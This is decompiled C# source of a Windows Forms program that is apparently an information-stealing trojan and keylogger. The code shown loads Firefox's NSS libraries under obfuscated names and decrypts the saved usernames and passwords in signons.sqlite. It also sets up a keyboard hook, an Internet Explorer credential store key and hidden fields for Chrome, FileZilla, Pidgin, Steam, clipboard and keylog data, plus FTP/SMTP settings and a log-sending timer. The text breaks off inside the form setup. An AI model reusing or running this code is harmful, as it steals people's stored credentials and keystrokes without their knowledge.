using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.SQLite;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using AdasdASDwdadwAWD.My;
using AdasdASDwdadwAWD.SQLiteWrapper;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;

namespace AdasdASDwdadwAWD;

[DesignerGenerated]
public class Form1 : Form
{
	private delegate int KeyboardHookDelegate(int Code, int wParam, ref KBDLLHOOKSTRUCT lParam);

	public struct KBDLLHOOKSTRUCT
	{
		public int vkCode;

		public int scanCode;

		public int flags;

		public int time;

		public int dwExtraInfo;
	}

	private struct DATA_BLOB2
	{
		public IntPtr cbData;

		public IntPtr pbData;
	}

	private struct CREDENTIAL
	{
		public IntPtr dwFlags;

		public IntPtr dwType;

		public IntPtr lpstrTargetName;

		public IntPtr lpstrComment;

		public FILETIME ftLastWritten;

		public IntPtr dwCredentialBlobSize;

		public IntPtr lpbCredentialBlob;

		public IntPtr dwPersist;

		public IntPtr dwAttributeCount;

		public IntPtr lpAttributes;

		public IntPtr lpstrTargetAlias;

		public IntPtr lpUserName;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct CRYPTPROTECT_PROMPTSTRUCT
	{
		public int cbSize;

		public CryptProtectPromptFlags dwPromptFlags;

		public IntPtr hwndApp;

		public string szPrompt;
	}

	[Flags]
	public enum CryptProtectPromptFlags
	{
		CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
		CRYPTPROTECT_PROMPT_ON_PROTECT = 2
	}

	public class dec
	{
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long DLLFunctionDelegate(string configdir);

		public class StairsEncryption
		{
			public static string Crypt(string Data, string key)
			{
				return Encoding.Default.GetString(Crypt(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(key)));
			}

			public static byte[] Crypt(byte[] Data, byte[] key)
			{
				int num = checked(Data.Length * 2 + key.Length);
				for (int i = 0; i <= num; i = checked(i + 1))
				{
					Data[i % Data.Length] = (byte)(checked((byte)unchecked(checked(unchecked((int)Data[i % Data.Length]) + unchecked((int)Data[checked(i + 1) % Data.Length])) % 256)) ^ key[i % key.Length]);
				}
				return Data;
			}

			public static string DeCrypt(string Data, string key)
			{
				return Encoding.Default.GetString(DeCrypt(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(key)));
			}

			public static byte[] DeCrypt(byte[] Data, byte[] key)
			{
				checked
				{
					for (int i = Data.Length * 2 + key.Length; i >= 0; i += -1)
					{
						Data[unchecked(i % Data.Length)] = (byte)unchecked(checked(unchecked(Data[i % Data.Length] ^ key[i % key.Length]) - unchecked((int)Data[checked(i + 1) % Data.Length]) + 256) % 256);
					}
					return Data;
				}
			}
		}

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long DLLFunctionDelegate2();

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

		public struct TSECItem
		{
			public int SECItemType;

			public int SECItemData;

			public int SECItemLen;
		}

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);

		private IntPtr NSS3;

		[DllImport("kernel32.dll")]
		private static extern IntPtr LoadLibrary(string dllFilePath);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		public long NSS_Init(string configdir)
		{
			string text = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
			LoadLibrary(text + StairsEncryption.DeCrypt("ÀíBÝ\tÜšÄ·ýjS", "1337"));
			string data = StairsEncryption.Crypt("nspr4.dll", "1337");
			LoadLibrary(text + StairsEncryption.DeCrypt(data, "1337"));
			string data2 = StairsEncryption.Crypt("plc4.dll", "1337");
			LoadLibrary(text + StairsEncryption.DeCrypt(data2, "1337"));
			string data3 = StairsEncryption.Crypt("plds4.dll", "1337");
			LoadLibrary(text + StairsEncryption.DeCrypt(data3, "1337"));
			string data4 = StairsEncryption.Crypt("ssutil3.dll", "1337");
			LoadLibrary(text + StairsEncryption.DeCrypt(data4, "1337"));
			string data5 = StairsEncryption.Crypt("sqlite3.dll", "1337");
			LoadLibrary(text + StairsEncryption.DeCrypt(data5, "1337"));
			string data6 = StairsEncryption.Crypt("nssutil3.dll", "1337");
			LoadLibrary(text + StairsEncryption.DeCrypt(data6, "1337"));
			string data7 = StairsEncryption.Crypt("nssutil3.dll", "1337");
			LoadLibrary(text + StairsEncryption.DeCrypt(data7, "1337"));
			string data8 = StairsEncryption.Crypt("nss3.dll", "1337");
			NSS3 = LoadLibrary(text + StairsEncryption.DeCrypt(data8, "1337"));
			string data9 = StairsEncryption.Crypt("NSS_Init", "1337");
			string procName = StairsEncryption.DeCrypt(data9, "1337");
			IntPtr procAddress = GetProcAddress(NSS3, procName);
			DLLFunctionDelegate dLLFunctionDelegate = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate));
			return dLLFunctionDelegate(configdir);
		}

		public long PK11_GetInternalKeySlot()
		{
			IntPtr procAddress = GetProcAddress(NSS3, "PK11_GetInternalKeySlot");
			DLLFunctionDelegate2 dLLFunctionDelegate = (DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate2));
			return dLLFunctionDelegate();
		}

		public long PK11_Authenticate(long slot, bool loadCerts, long wincx)
		{
			IntPtr procAddress = GetProcAddress(NSS3, "PK11_Authenticate");
			DLLFunctionDelegate3 dLLFunctionDelegate = (DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate3));
			return dLLFunctionDelegate(slot, loadCerts, wincx);
		}

		public int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
		{
			IntPtr procAddress = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer");
			DLLFunctionDelegate4 dLLFunctionDelegate = (DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate4));
			return dLLFunctionDelegate(arenaOpt, outItemOpt, inStr, inLen);
		}

		public int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
		{
			IntPtr procAddress = GetProcAddress(NSS3, "PK11SDR_Decrypt");
			DLLFunctionDelegate5 dLLFunctionDelegate = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate5));
			return dLLFunctionDelegate(ref data, ref result, cx);
		}

		public object Decrypt()
		{
			int try0000_dispatch = -1;
			int num2 = default(int);
			string text4 = default(string);
			int num = default(int);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					checked
					{
						switch (try0000_dispatch)
						{
						default:
						{
							ProjectData.ClearProjectError();
							num2 = 2;
							string text = string.Empty;
							bool flag = false;
							long num3 = 0L;
							_ = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
							string path = Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles";
							string[] directories = Directory.GetDirectories(path);
							string[] array = directories;
							foreach (string text2 in array)
							{
								if (flag)
								{
									break;
								}
								string[] files = Directory.GetFiles(text2);
								string[] array2 = files;
								foreach (string text3 in array2)
								{
									if (flag)
									{
										break;
									}
									if (Regex.IsMatch(text3, "signons.sqlite"))
									{
										NSS_Init(text2);
										text4 = text3;
									}
								}
							}
							string baseName = text4;
							TSECItem tSECItem = default(TSECItem);
							TSECItem result = default(TSECItem);
							TSECItem result2 = default(TSECItem);
							SQLiteBase sQLiteBase = new SQLiteBase(baseName);
							DataTable dataTable = sQLiteBase.ExecuteQuery("SELECT * FROM moz_logins;");
							DataTable dataTable2 = sQLiteBase.ExecuteQuery("SELECT * FROM moz_disabledHosts;");
							IEnumerator enumerator = dataTable2.Rows.GetEnumerator();
							while (enumerator.MoveNext())
							{
								_ = (DataRow)enumerator.Current;
							}
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
							num3 = PK11_GetInternalKeySlot();
							PK11_Authenticate(num3, loadCerts: true, 0L);
							IEnumerator enumerator2 = dataTable.Rows.GetEnumerator();
							while (enumerator2.MoveNext())
							{
								DataRow dataRow = (DataRow)enumerator2.Current;
								string text5 = Convert.ToString(dataRow["formSubmitURL"].ToString());
								text = text + "-------------------------\r\nWebsite: " + text5 + "\r\n";
								MyProject.Forms.Form1.RTFirefox.set_Text(text);
								StringBuilder stringBuilder = new StringBuilder(dataRow["encryptedUsername"].ToString());
								int value = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
								IntPtr ptr = new IntPtr(value);
								TSECItem data = (TSECItem)Marshal.PtrToStructure(ptr, typeof(TSECItem));
								if (PK11SDR_Decrypt(ref data, ref result, 0) == 0 && result.SECItemLen != 0)
								{
									byte[] array3 = new byte[result.SECItemLen - 1 + 1];
									ptr = new IntPtr(result.SECItemData);
									Marshal.Copy(ptr, array3, 0, result.SECItemLen);
									text = text + "Username: " + Encoding.ASCII.GetString(array3) + "\r\n";
								}
								StringBuilder stringBuilder2 = new StringBuilder(dataRow["encryptedPassword"].ToString());
								int value2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
								ptr = new IntPtr(value2);
								TSECItem data2 = (TSECItem)Marshal.PtrToStructure(ptr, typeof(TSECItem));
								if (PK11SDR_Decrypt(ref data2, ref result2, 0) == 0 && result2.SECItemLen != 0)
								{
									byte[] array3 = new byte[result2.SECItemLen - 1 + 1];
									ptr = new IntPtr(result2.SECItemData);
									Marshal.Copy(ptr, array3, 0, result2.SECItemLen);
									text = text + "Password: " + Encoding.ASCII.GetString(array3) + "\r\n-------------------------\r\n";
								}
							}
							if (enumerator2 is IDisposable)
							{
								(enumerator2 as IDisposable).Dispose();
							}
							break;
						}
						case 842:
							num = -1;
							switch (num2)
							{
							case 2:
								break;
							default:
								goto IL_0382;
							}
							break;
						}
					}
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0000_dispatch = 842;
					continue;
				}
				break;
				IL_0382:
				throw ProjectData.CreateProjectError(-2146828237);
			}
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
			object result3 = default(object);
			return result3;
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
	public struct INTERNET_CACHE_ENTRY_INFO
	{
		public int dwStructSize;

		[MarshalAs(UnmanagedType.LPTStr)]
		public string lpszSourceUrlName;

		[MarshalAs(UnmanagedType.LPTStr)]
		public string lpszLocalFileName;

		public int CacheEntryType;

		public int dwUseCount;

		public int dwHitRate;

		public int dwSizeLow;

		public int dwSizeHigh;

		public FILETIME LastModifiedTime;

		public FILETIME ExpireTime;

		public FILETIME LastAccessTime;

		public FILETIME LastSyncTime;

		public IntPtr lpHeaderInfo;

		public int dwHeaderInfoSize;

		public IntPtr lpszFileExtension;

		public int dwExemptDelta;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct DATA_BLOB
	{
		public int cbData;

		public IntPtr pbData;
	}

	public struct StringIndexEntry
	{
		public int dwDataOffset;

		public FILETIME ftInsertDateTime;

		public int dwDataSize;
	}

	public struct StringIndexHeader
	{
		public int dwWICK;

		public int dwStructSize;

		public int dwEntriesCount;

		public int dwUnkId;

		public int dwType;

		public int dwUnk;
	}

	public delegate int CallNextHookEx(int hHook, int nCode, int wParam, KBDLLHOOKSTRUCT lParam);

	public class SHITEMID
	{
		public static long cb;

		public static byte[] abID;
	}

	public enum pYrTgbzWFEpYpYrTrTgbzWFEpYpYrT
	{
		GcWejaatNblRYpYrTgbzWFEp = 13,
		YpYrTgbzWFEp = 8,
		YpYrTgbzWFEpYpYrTgbzWFEp = 32,
		vGcWejaatNblRYpYrTgbzWFE = 9,
		vGcWejaatNblRYpYrTgbzWFEvGcWejaatNblRYpYrTgbzWFE = 27,
		rTgbzWFEpYpYrTrTgbzWFEpYpYrT = 162,
		rTgbzWFEpYgbzWFEpYpYrT = 163,
		rTgbzWFEpYpYrTrTgbzWbzWFEpYpYrT = 46,
		rTgbzWFEpYpYrT = 35,
		rTgbzWFEpYpYrTaSDads = 36,
		rTgbzWFEpYpYrTaSDDasdad = 45,
		rTgbzWFEpYpYrTaSXasdad = 16,
		rTgbzWFEpYpYrTaSXasdadSdd = 160,
		rTgbzxxxWFEpYpYrTaSXasdaxxdSdd = 161,
		rTgbzxxxWFEpYpYrTaSXxasdaxxdSdd = 33,
		rTgbzxxxWFEpYpYrTaSXxxasdaxxdSdd = 34,
		rTgbzxxxWFEpYpYrTaSxXxxasdaxxdSdd = 145,
		rTgbzxxxWFEpYpYrTaxSxXxxasdaxxdSdd = 44,
		rTgbzxxxWFEpYpYrTaxSxxXxxasdaxxdSdd = 91,
		rTgbzxxxWFEpdYpYrTaxSxxXxxasdaxxdSdd = 92,
		rTgbzxxxWFEpYpYrTaxSxxXxxasdaxxxdSdd = 18,
		rTgbzxxxWFEpYpYrTddaxSxxXxxasdaxxxdSdd = 164,
		rTgbzxxxWFEpYpdYrTddaxSxxXxxasdaxxxdSdd = 165,
		K_NumLock = 144,
		K_CapsLock = 20,
		K_Up = 38,
		K_Down = 40,
		K_Right = 39,
		K_Left = 37,
		K_F1 = 112,
		K_F2 = 113,
		K_F3 = 114,
		K_F4 = 115,
		K_F5 = 116,
		K_F6 = 117,
		K_F7 = 118,
		K_F8 = 119,
		K_F9 = 120,
		K_F10 = 121,
		K_F11 = 122,
		K_F12 = 123,
		K_F13 = 124,
		K_F14 = 125,
		K_F15 = 126,
		K_F16 = 127,
		K_F17 = 128,
		K_F18 = 129,
		K_F19 = 130,
		K_F20 = 131,
		K_F21 = 132,
		K_F22 = 133,
		K_F23 = 134,
		K_F24 = 135,
		K_Numpad0 = 96,
		K_Numpad1 = 97,
		K_Numpad2 = 98,
		K_Numpad3 = 99,
		K_Numpad4 = 100,
		K_Numpad5 = 101,
		K_Numpad6 = 102,
		K_Numpad7 = 103,
		K_Numpad8 = 104,
		K_Numpad9 = 105,
		K_Num_Add = 107,
		K_Num_Divide = 111,
		K_Num_Multiply = 106,
		K_Num_Subtract = 109,
		K_Num_Decimal = 110,
		K_0 = 48,
		K_1 = 49,
		K_2 = 50,
		K_3 = 51,
		K_4 = 52,
		K_5 = 53,
		K_6 = 54,
		K_7 = 55,
		K_8 = 56,
		K_9 = 57,
		K_A = 65,
		K_B = 66,
		K_C = 67,
		K_D = 68,
		K_E = 69,
		K_F = 70,
		K_G = 71,
		K_H = 72,
		K_I = 73,
		K_J = 74,
		K_K = 75,
		K_L = 76,
		K_M = 77,
		K_N = 78,
		K_O = 79,
		K_P = 80,
		K_Q = 81,
		K_R = 82,
		K_S = 83,
		K_T = 84,
		K_U = 85,
		K_V = 86,
		K_W = 87,
		K_X = 88,
		K_Y = 89,
		K_Z = 90,
		K_Subtract = 189,
		K_Decimal = 190,
		K_Comma = 188,
		K_BackSl = 191,
		K_Colon = 186,
		K_Ampersand = 222,
		K_SQLbr = 219,
		K_SQRbr = 221,
		K_ForwSl = 220,
		K_Equals = 187,
		K_PrtScrn = 44,
		K_BBE = 192
	}

	private IContainer components;

	[AccessedThroughProperty("RTFirefox")]
	private RichTextBox _RTFirefox;

	[AccessedThroughProperty("RTChrome")]
	private RichTextBox _RTChrome;

	[AccessedThroughProperty("RTInternetExplorer")]
	private RichTextBox _RTInternetExplorer;

	[AccessedThroughProperty("RTMsn")]
	private RichTextBox _RTMsn;

	[AccessedThroughProperty("RTFileZilla")]
	private RichTextBox _RTFileZilla;

	[AccessedThroughProperty("RTPCInfo")]
	private RichTextBox _RTPCInfo;

	[AccessedThroughProperty("RTIMVU")]
	private RichTextBox _RTIMVU;

	[AccessedThroughProperty("RTNoIP")]
	private RichTextBox _RTNoIP;

	[AccessedThroughProperty("RTWindowsKey")]
	private RichTextBox _RTWindowsKey;

	[AccessedThroughProperty("RTPidgin")]
	private RichTextBox _RTPidgin;

	[AccessedThroughProperty("LogsSender")]
	private Timer _LogsSender;

	[AccessedThroughProperty("RTKLog")]
	private RichTextBox _RTKLog;

	[AccessedThroughProperty("RTStealLog")]
	private RichTextBox _RTStealLog;

	[AccessedThroughProperty("SteamCachePath")]
	private TextBox _SteamCachePath;

	[AccessedThroughProperty("txtFTPserver")]
	private TextBox _txtFTPserver;

	[AccessedThroughProperty("txtFTPuser")]
	private TextBox _txtFTPuser;

	[AccessedThroughProperty("txtFTPpass")]
	private TextBox _txtFTPpass;

	[AccessedThroughProperty("txtEmail")]
	private TextBox _txtEmail;

	[AccessedThroughProperty("txtEmailPass")]
	private TextBox _txtEmailPass;

	[AccessedThroughProperty("txtEmailSMTP")]
	private TextBox _txtEmailSMTP;

	[AccessedThroughProperty("txtSMTPPort")]
	private TextBox _txtSMTPPort;

	[AccessedThroughProperty("txtEmailFTP")]
	private TextBox _txtEmailFTP;

	[AccessedThroughProperty("ClipboardLog")]
	private Timer _ClipboardLog;

	[AccessedThroughProperty("RTBClipboard")]
	private RichTextBox _RTBClipboard;

	[AccessedThroughProperty("lblNumb")]
	private Label _lblNumb;

	[AccessedThroughProperty("RTKeys")]
	private RichTextBox _RTKeys;

	private string chpasses;

	private string chromepasses;

	private const uint ALG_CLASS_HASH = 32768u;

	private const uint ALG_TYPE_ANY = 0u;

	private const uint ALG_CLASS_DATA_ENCRYPT = 24576u;

	private const uint ALG_TYPE_STREAM = 2048u;

	private const uint ALG_TYPE_BLOCK = 1536u;

	private const uint ALG_SID_DES = 1u;

	private const uint ALG_SID_RC4 = 1u;

	private const uint ALG_SID_RC2 = 2u;

	private const uint ALG_SID_MD5 = 3u;

	private const uint ALG_SID_SHA = 4u;

	public const string MS_DEF_PROV = "Microsoft Base Cryptographic Provider v1.0";

	public const uint PROV_RSA_FULL = 1u;

	public const uint CRYPT_EXPORTABLE = 1u;

	public static readonly uint CALG_MD5 = 32771u;

	public static readonly uint CALG_DES = 26113u;

	public static readonly uint CALG_RC2 = 26114u;

	public static readonly uint CALG_RC4 = 26625u;

	internal const int CALG_SHA = 32772;

	internal const int HP_HASHVAL = 2;

	private const string CryptDll = "advapi32.dll";

	private const string KernelDll = "kernel32.dll";

	private static string IE_KEY = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";

	private static string visited = "";

	private const int ERROR_NO_MORE_ITEMS = 259;

	private IntPtr KeyboardHandle;

	private string LastCheckedForegroundTitle;

	private KeyboardHookDelegate callback;

	private string _kLoq;

	private const int WM_KEYUP = 257;

	private const short WM_KEYDOWN = 256;

	private const int WM_SYSKEYDOWN = 260;

	private const int WM_SYSKEYUP = 261;

	private const int CSIDL_LOCAL_APPDATA = 28;

	private StringBuilder path;

	private string Stored;

	internal virtual RichTextBox RTFirefox
	{
		get
		{
			return _RTFirefox;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RTFirefox = value;
		}
	}

	internal virtual RichTextBox RTChrome
	{
		get
		{
			return _RTChrome;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RTChrome = value;
		}
	}

	internal virtual RichTextBox RTInternetExplorer
	{
		get
		{
			return _RTInternetExplorer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RTInternetExplorer = value;
		}
	}

	internal virtual RichTextBox RTMsn
	{
		get
		{
			return _RTMsn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RTMsn = value;
		}
	}

	internal virtual RichTextBox RTFileZilla
	{
		get
		{
			return _RTFileZilla;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RTFileZilla = value;
		}
	}

	internal virtual RichTextBox RTPCInfo
	{
		get
		{
			return _RTPCInfo;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RTPCInfo = value;
		}
	}

	internal virtual RichTextBox RTIMVU
	{
		get
		{
			return _RTIMVU;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RTIMVU = value;
		}
	}

	internal virtual RichTextBox RTNoIP
	{
		get
		{
			return _RTNoIP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RTNoIP = value;
		}
	}

	internal virtual RichTextBox RTWindowsKey
	{
		get
		{
			return _RTWindowsKey;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RTWindowsKey = value;
		}
	}

	internal virtual RichTextBox RTPidgin
	{
		get
		{
			return _RTPidgin;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RTPidgin = value;
		}
	}

	internal virtual Timer LogsSender
	{
		get
		{
			return _LogsSender;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = LogsSender_Tick;
			if (_LogsSender != null)
			{
				_LogsSender.remove_Tick(eventHandler);
			}
			_LogsSender = value;
			if (_LogsSender != null)
			{
				_LogsSender.add_Tick(eventHandler);
			}
		}
	}

	internal virtual RichTextBox RTKLog
	{
		get
		{
			return _RTKLog;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RTKLog = value;
		}
	}

	internal virtual RichTextBox RTStealLog
	{
		get
		{
			return _RTStealLog;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RTStealLog = value;
		}
	}

	internal virtual TextBox SteamCachePath
	{
		get
		{
			return _SteamCachePath;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_SteamCachePath = value;
		}
	}

	internal virtual TextBox txtFTPserver
	{
		get
		{
			return _txtFTPserver;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_txtFTPserver = value;
		}
	}

	internal virtual TextBox txtFTPuser
	{
		get
		{
			return _txtFTPuser;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_txtFTPuser = value;
		}
	}

	internal virtual TextBox txtFTPpass
	{
		get
		{
			return _txtFTPpass;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_txtFTPpass = value;
		}
	}

	internal virtual TextBox txtEmail
	{
		get
		{
			return _txtEmail;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_txtEmail = value;
		}
	}

	internal virtual TextBox txtEmailPass
	{
		get
		{
			return _txtEmailPass;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_txtEmailPass = value;
		}
	}

	internal virtual TextBox txtEmailSMTP
	{
		get
		{
			return _txtEmailSMTP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_txtEmailSMTP = value;
		}
	}

	internal virtual TextBox txtSMTPPort
	{
		get
		{
			return _txtSMTPPort;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_txtSMTPPort = value;
		}
	}

	internal virtual TextBox txtEmailFTP
	{
		get
		{
			return _txtEmailFTP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_txtEmailFTP = value;
		}
	}

	internal virtual Timer ClipboardLog
	{
		get
		{
			return _ClipboardLog;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = ClipboardLog_Tick;
			if (_ClipboardLog != null)
			{
				_ClipboardLog.remove_Tick(eventHandler);
			}
			_ClipboardLog = value;
			if (_ClipboardLog != null)
			{
				_ClipboardLog.add_Tick(eventHandler);
			}
		}
	}

	internal virtual RichTextBox RTBClipboard
	{
		get
		{
			return _RTBClipboard;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RTBClipboard = value;
		}
	}

	internal virtual Label lblNumb
	{
		get
		{
			return _lblNumb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_lblNumb = value;
		}
	}

	internal virtual RichTextBox RTKeys
	{
		get
		{
			return _RTKeys;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RTKeys = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		chpasses = string.Empty;
		chromepasses = string.Empty;
		KeyboardHandle = (IntPtr)0;
		LastCheckedForegroundTitle = "";
		callback = null;
		path = new StringBuilder(260);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Expected O, but got Unknown
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_011f: Expected O, but got Unknown
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		//IL_012a: Expected O, but got Unknown
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0135: Expected O, but got Unknown
		components = new Container();
		RTFirefox = new RichTextBox();
		RTChrome = new RichTextBox();
		RTInternetExplorer = new RichTextBox();
		RTMsn = new RichTextBox();
		RTFileZilla = new RichTextBox();
		RTPCInfo = new RichTextBox();
		RTIMVU = new RichTextBox();
		RTNoIP = new RichTextBox();
		RTWindowsKey = new RichTextBox();
		RTPidgin = new RichTextBox();
		LogsSender = new Timer(components);
		RTKLog = new RichTextBox();
		RTStealLog = new RichTextBox();
		SteamCachePath = new TextBox();
		txtFTPserver = new TextBox();
		txtFTPuser = new TextBox();
		txtFTPpass = new TextBox();
		txtEmail = new TextBox();
		txtEmailPass = new TextBox();
		txtEmailSMTP = new TextBox();
		txtSMTPPort = new TextBox();
		txtEmailFTP = new TextBox();
		ClipboardLog = new Timer(components);
		RTBClipboard = new RichTextBox();
		lblNumb = new Label();
		RTKeys = new RichTextBox();
		((Control)this).SuspendLayout();
		RichTextBox rTFirefox = RTFirefox;
		Point location = new Point(487, 401);
		((Control)rTFirefox).set_Location(location);
		((Control)RTFirefox).set_Name("RTFirefox");
		RichTextBox rTFirefox2 = RTFirefox;
		Size size = new Size(315, 111);
		((Control)rTFirefox2).set_Size(size);
		((Control)RTFirefox).set_TabIndex(0);
		RTFirefox.set_Text("");
		((Control)RTFirefox).set_Visible(false);
		RichTextBox rTChrome = RTChrome;
		location = new Point(639, 518);
		((Control)rTChrome).set_Location(location);
		((Control)RTChrome).set_Name("RTChrome");
		RichTextBox rTChrome2 = RTChrome;
		size = new Size(315, 120);
		((Control)rTChrome2).set_Size(size);
		((Control)RTChrome).set_TabIndex(1);
		RTChrome.set_Text("");
		((Control)RTChrome).set_Visible(false);
		RichTextBox rTInternetExplorer = RTInternetExplorer;
		location = new Point(552, 540);
